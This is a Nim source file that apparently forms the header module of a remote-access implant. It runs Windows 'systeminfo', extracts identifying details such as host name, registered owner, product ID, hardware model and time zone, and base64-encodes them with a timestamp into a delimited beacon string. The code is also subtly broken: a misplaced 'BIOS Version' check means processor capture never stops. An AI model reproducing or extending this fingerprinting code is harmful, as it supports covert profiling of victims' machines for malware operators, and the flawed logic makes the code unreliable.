from strutils import contains
from strutils import split
from strutils import unIndent
from base64 import encode
from times import now
from times import DateTime
import ../functions/runCmd

proc formatData(data: string): string =
  result = ";" & encode unIndent data.split(": ")[1]

proc header*(): string =
  result.add ".h,"

  let systemInfo: string = runCmd "systeminfo"
  var getProcessors: bool = false
  var cache: string

  for line in systemInfo.split "\n":
    if
      line.contains("OS Name:") or
      line.contains("OS Version:") or
      line.contains("Host Name:") or
      line.contains("Registered Owner:") or
      line.contains("Product ID:") or
      line.contains("System Manufacturer:") or
      line.contains("System Model:") or
      line.contains("Time Zone:") or
      line.contains("Total Physical Memory:"):

      if line.contains("BIOS Version:"):
        getProcessors = false

      if line.contains("OS Name:") or line.contains("System Manufacturer:"):
        cache = line
      elif line.contains("OS Version:") or line.contains("System Model:"):
        result.add formatData(cache & " " & unIndent(line.split(": ")[1]))
      else:
        result.add formatData line

    if line.contains("Processor(s):"):
      getProcessors = true

    if getProcessors:
      result.add formatData line

  let now: DateTime = now()

  result.add ";" & encode $now.year & "/" & $now.month & "/" & $now.monthday & "/" &
    $now.hour & "/" & $now.minute & "/" & $now.second
